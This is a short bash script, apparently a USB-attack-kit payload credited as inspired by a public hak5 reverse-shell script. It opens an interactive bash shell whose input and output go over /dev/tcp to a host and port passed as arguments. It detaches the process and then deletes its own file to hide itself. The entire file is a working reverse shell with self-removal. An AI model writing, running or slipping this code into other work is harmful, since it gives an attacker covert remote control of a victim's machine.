#!/bin/bash
# INSPIRED BY: https://github.com/hak5/bashbunny-payloads/blob/27d63ad5a535510b20787cc03850b28bbdb727ee/payloads/library/remote_access/LinuxReverseShell/a.sh

A="$0"
H=$1
P=$2
/bin/bash -c /bin/bash -i > /dev/tcp/$H/$P 0<&1 2>&1 &
disown $!
rm -f "$A"
